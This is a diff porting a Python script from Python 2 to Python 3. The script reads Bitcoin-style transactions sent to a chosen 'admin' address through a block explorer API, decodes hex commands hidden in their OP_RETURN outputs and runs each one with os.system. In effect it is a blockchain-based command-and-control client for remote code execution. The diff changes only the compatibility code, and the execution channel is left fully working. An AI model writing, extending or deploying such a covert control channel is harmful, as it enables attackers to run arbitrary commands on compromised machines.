@@ -1,8 +1,16 @@
-# !/usr/bin/python2
+# !/usr/bin/python
 # -*- coding: utf-8 -*-
 
 from binascii import unhexlify
-import urllib
+
+try:
+    # Support for Python 3
+    import urllib.request as u
+except:
+    # Support for Python 2
+    import urllib as u
+
+
 import json
 import os
 
@@ -27,7 +35,7 @@ def buildURL(address, netcode="XTN", provider="blockexplorer"):
 
 def getNewCommand(address, netcode="XTN"):
     url = buildURL(address, netcode=netcode)
-    raw = urllib.urlopen(url).read()
+    raw = u.urlopen(url).read()
     #mgiEN7RWEogjPFq5eAgK765kiibvc9sGNB
     data = json.loads(raw)
     #print json.dumps(data, indent=2)
@@ -35,25 +43,25 @@ def getNewCommand(address, netcode="XTN"):
 
 if __name__ == "__main__":
     # Getting the network type
-    network = raw_input("> Choose type of network (BTC, XTN, LTC, ...) [XTN]: ") or "XTN"
-    print "\tNetwork: " + network
+    network = input("> Choose type of network (BTC, XTN, LTC, ...) [XTN]: ") or "XTN"
+    print("\tNetwork: " + network)
 
     # Getting the administrators address! Needed so as to prevent hijacking!
-    admin = raw_input("> Type the ADMIN address: ")
-    print "\tAdmin address: " + admin
+    admin = input("> Type the ADMIN address: ")
+    print("\tAdmin address: " + admin)
 
     # Getting the address to be monitored
     #target = raw_input("> Type target address: ")
     target = admin
-    print "\tTarget: " + target
+    print("\tTarget: " + target)
 
     data = getNewCommand(target, network)
 
-    print "> Info recovered from " + target
-    print "> Transactions recovered: " + str(len(data["txs"]))
+    print("> Info recovered from " + target)
+    print("> Transactions recovered: " + str(len(data["txs"])))
 
     for i, tx in enumerate(data["txs"]):
-        print "> Processing transaction " + str(i+1) + "/" + str(len(data["txs"])) + "..."
+        print("> Processing transaction " + str(i+1) + "/" + str(len(data["txs"])) + "...")
         # Check if the emitter is the admin
         is_admin = False
         for v in tx["vin"]:
@@ -67,8 +75,8 @@ if __name__ == "__main__":
         for v in tx["vout"]:
             if "OP_RETURN" in v["scriptPubKey"]["asm"]:
                 command = v["scriptPubKey"]["asm"].split(" ")[1]
-                print "> Command found in OP_RETURN transaction:"
-                print "\t" + unhexlify(command)
-                print "> Running the command:"
+                print("> Command found in OP_RETURN transaction:")
+                print("\t" + unhexlify(command))
+                print("> Running the command:")
                 os.system(unhexlify(command))
                 break
